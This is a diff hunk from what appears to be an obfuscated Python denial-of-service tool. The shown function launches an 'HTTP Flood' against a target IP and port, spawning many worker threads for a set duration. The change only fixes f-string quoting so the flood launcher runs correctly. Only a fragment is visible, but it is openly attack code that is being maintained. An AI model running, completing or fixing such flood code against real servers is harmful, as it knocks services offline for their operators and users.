@@ -134,7 +134,7 @@ def Av(ip,port,secs,stop_event):
 				try:A.close()
 				except:pass
 		except:pass
-	Z=Au();O(f"[🌐] HTTP Flood iniciado");O(f"[+] Target: {"https"if T else"http"}://{ip}:{K}");O(f"[+] Duration: {G(M)}s");O(f"[+] Workers: {Z}");a=[]
+	Z=Au();O(f"[🌐] HTTP Flood iniciado");O(f"[+] Target: {'https'if T else'http'}://{ip}:{K}");O(f"[+] Duration: {G(M)}s");O(f"[+] Workers: {Z}");a=[]
 	for k in H(Z):J=N.Thread(target=j,args=(k,),daemon=E);J.start();a.append(J);B.sleep(.001)
 	B.sleep(M);P.set()
 	for J in a:
